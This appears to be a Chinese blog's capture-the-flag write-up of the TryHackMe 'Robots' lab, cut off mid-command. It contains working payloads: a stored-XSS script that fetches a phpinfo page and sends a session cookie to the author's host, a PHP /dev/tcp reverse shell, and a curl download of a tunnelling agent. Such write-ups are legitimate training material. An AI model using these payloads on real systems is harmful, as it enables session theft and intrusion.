<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">TryHackMe - Robots</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c857437f03c4233f.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c857437f03c4233f.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-96105b52cb28f049.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-c3ab83f461067717.js" defer=""></script><script src="/_next/static/VCIb495z0pnVej4jJq3tb/_buildManifest.js" defer=""></script><script src="/_next/static/VCIb495z0pnVej4jJq3tb/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700">TryHackMe - Robots</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-05-27</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-05-27<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">TryHackMe</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">XSS</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Mysql</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Apache2</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">PortForward</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TryHackMeRobots","contentHtml":"\u003ch1\u003eRobots\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/room/robots\"\u003ehttps://tryhackme.com/room/robots\u003c/a\u003e | Hard\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：A (small) tribute to I. Asimov.\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots nmap -sT -min-rate 5000 -p- 10.10.188.220       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-26 10:08 EDT\nWarning: 10.10.188.220 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.188.220\nHost is up (0.31s latency).\nNot shown: 64287 closed tcp ports (conn-refused), 1245 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n9000/tcp open  cslistener\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 59.85 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots nmap -sT -A -T4 -O -p 22,80,9000 10.10.188.220\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-26 10:10 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.188.220\nHost is up (0.31s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 (protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.61\n| http-robots.txt: 3 disallowed entries \n|_/harming/humans /ignoring/human/orders /harm/to/self\n|_http-server-header: Apache/2.4.61 (Debian)\n|_http-title: 403 Forbidden\n9000/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: robots.thm\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   311.56 ms 10.21.0.1\n2   311.71 ms 10.10.188.220\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e将 \u003ccode\u003erobots.thm\u003c/code\u003e写入\u003ccode\u003ehosts\u003c/code\u003e，因为关卡名字是\u003ccode\u003erobots\u003c/code\u003e ，故访问一下\u003ccode\u003erobots\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eDisallow: /harming/humans\nDisallow: /ignoring/human/orders\nDisallow: /harm/to/self\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中\u003ccode\u003e/harming/humans\u003c/code\u003e和\u003ccode\u003e/ignoring/human/orders\u003c/code\u003e 弹 \u003ccode\u003e403\u003c/code\u003e ，\u003ccode\u003e/harm/to/self\u003c/code\u003e 是登录页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注册页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注册用户 \u003ccode\u003esunset\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eda16e6c8fd634c1062184c03622da91a\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登陆进去后的页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击左上角的 \u003ccode\u003eServer info\u003c/code\u003e ,是\u003ccode\u003ephpinfo\u003c/code\u003e信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是在里面能看到登陆后的\u003ccode\u003eCookie\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e继续测试，测试了\u003ccode\u003eSQL\u003c/code\u003e注入等一系列漏洞后没找到可利用的，然后发现我们的用户名可以在登录后的后台中显示出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们尝试测试一下 \u003ccode\u003eXSS\u003c/code\u003e ，我们注册用户 \u003ccode\u003e\u0026#x3C;script\u003ealert(2);\u0026#x3C;/script\u003e\u003c/code\u003e ，然后进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以发现代码被触发了，存在存储型\u003ccode\u003eXSS\u003c/code\u003e漏洞\u003c/p\u003e\n\u003ch3\u003eXSS - 窃取管理员 Cookie\u003c/h3\u003e\n\u003cp\u003e测试是否出网\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;script\u003elocation.href=\u003cspan class=\"hljs-string\"\u003e'http://10.21.192.44/1111'\u003c/span\u003e\u0026#x3C;/script\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以，并且能发现服务端（可能注册页面的\u003ccode\u003eAn admin monitors new users.\u003c/code\u003e 有关）会访问我们\u003c/p\u003e\n\u003cp\u003e尝试窃取管理员\u003ccode\u003eCookie\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;script\u003elocation.href=\u003cspan class=\"hljs-string\"\u003e'http://10.21.192.44/Cookie'\u003c/span\u003e+document.cookie\u0026#x3C;/script\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现并没有能接收到\u003ccode\u003eCookie\u003c/code\u003e ，发现原来是开启了 \u003ccode\u003eHttpOnly\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是我们之前在后台页面的\u003ccode\u003eServer info\u003c/code\u003e 页面中有 \u003ccode\u003eCookie\u003c/code\u003e 信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e编写\u003ccode\u003eXSS\u003c/code\u003e代码用于注册新用户，获取\u003ccode\u003eServer info\u003c/code\u003e 的内容并返回到我们的服务器中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;script\u003efetch(\u003cspan class=\"hljs-string\"\u003e'/harm/to/self/server_info.php'\u003c/span\u003e).\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e(res=\u003eres.text()).\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e(text=\u003e{location=\u003cspan class=\"hljs-string\"\u003e'https://10.21.192.44/Cookie?content='\u003c/span\u003e+encodeURIComponent(text);});\u0026#x3C;/script\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等待服务器访问，但是出现了问题，请求太大而无法成功将请求发出，修改代码仅抓取 \u003ccode\u003ePHPSESSID\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;script\u003efetch(\u003cspan class=\"hljs-string\"\u003e'/harm/to/self/server_info.php'\u003c/span\u003e,{credentials:\u003cspan class=\"hljs-string\"\u003e'include'\u003c/span\u003e}).\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e(res=\u003eres.text()).\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e(text=\u003e{var m=text.match(/PHPSESSID=[^\\s\u0026#x3C;\u003e\u003cspan class=\"hljs-string\"\u003e\"']+/);if(m)location='http://10.21.192.44/Cookie?content='+encodeURIComponent(m[0]);});\u0026#x3C;/script\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次等待服务器访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e捕获到了服务器传来的请求\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePHPSESSID=lmccs0n6v9oic0kl8iguvlmcuc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e替换 \u003ccode\u003eCookie\u003c/code\u003e ，刷新页面即可进入到管理员后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进入后台后发现并没有什么新功能，\u003ccode\u003eFuzz\u003c/code\u003e 一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots ffuf -w ../../Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://robots.thm/harm/to/self/FUZZ.php -fs 662\n\n        /\u003cspan class=\"hljs-string\"\u003e'___\\  /'\u003c/span\u003e___\\           /\u003cspan class=\"hljs-string\"\u003e'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://robots.thm/harm/to/self/FUZZ.php\n :: Wordlist         : FUZZ: /root/Desktop/Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 662\n________________________________________________\n\nlogin                   [Status: 200, Size: 795, Words: 125, Lines: 36, Duration: 312ms]\nregister                [Status: 200, Size: 976, Words: 155, Lines: 39, Duration: 307ms]\nadmin                   [Status: 200, Size: 370, Words: 29, Lines: 28, Duration: 305ms]\nlogout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 310ms]\nconfig                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 305ms]\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eFuzz\u003c/code\u003e 出来 \u003ccode\u003eadmin.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e文件包含\u003c/h3\u003e\n\u003cp\u003e输入管理页面地址 \u003ccode\u003ehttp://robots.thm/harm/to/self/admin.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看输出应该是将其进行包含了，我们再测试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e test.php  \n\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Test Page\"\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功包含，我们进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e shell.php\n\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/10.21.192.44/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e数据库脱库\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003e/etc/passwd\u003c/code\u003e 文件，貌似没有可以操作的用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且可能是在 \u003ccode\u003eDocker\u003c/code\u003e 容器中\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看配置文件 \u003ccode\u003econfig.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@robots:/var/www/html/harm/to/self$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config.php \n\u0026#x3C;?php\n    \u003cspan class=\"hljs-variable\"\u003e$servername\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"db\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"robots\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"q4qCz1OflKvKwK4S\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-variable\"\u003e$dbname\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"web\"\u003c/span\u003e;\n// Get the current hostname\n\u003cspan class=\"hljs-variable\"\u003e$currentHostname\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'HTTP_HOST'\u003c/span\u003e];\n\n// Define the desired hostname\n\u003cspan class=\"hljs-variable\"\u003e$desiredHostname\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'robots.thm'\u003c/span\u003e;\n\n// Check \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e the current hostname does not match the desired hostname\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$currentHostname\u003c/span\u003e !== \u003cspan class=\"hljs-variable\"\u003e$desiredHostname\u003c/span\u003e) {\n    // Redirect to the desired hostname\n    header(\u003cspan class=\"hljs-string\"\u003e\"Location: http://\u003cspan class=\"hljs-variable\"\u003e$desiredHostname\u003c/span\u003e\"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_URI'\u003c/span\u003e]);\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e();\n}\nini_set(\u003cspan class=\"hljs-string\"\u003e'session.cookie_httponly'\u003c/span\u003e, 1);\n\nsession_start();\n\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e失败 - Stowaway backward\u003c/h3\u003e\n\u003cp\u003e应该是要进行数据库登录了，但是 \u003ccode\u003eshell\u003c/code\u003e 中并没有 \u003ccode\u003emysql\u003c/code\u003e 的命令，我们要将网络转发出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@robots:/tmp$ curl 10.21.192.44/linux_x64_agent --output /tmp/agent\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 2174k  100 2174k    0     0   528k      0  0:00:04  0:00:04 --:--:--  528k\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./linux_x64_admin -l 8000 -s 123\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@robots:/tmp$ ./agent -c 10.21.192.44:8000 -s 123 -reconnect 8 \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(node 0) \u003e\u003e backward 3306 3306\n[*] Trying to ask node to listen on 0.0.0.0:3306......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Backward start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e  (node 0) \u003e\u003e socks 8001 admin admin\n[*] Trying to listen on 0.0.0.0:8001......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Socks start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots proxychains mysql -urobots --protocol=TCP -p\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: 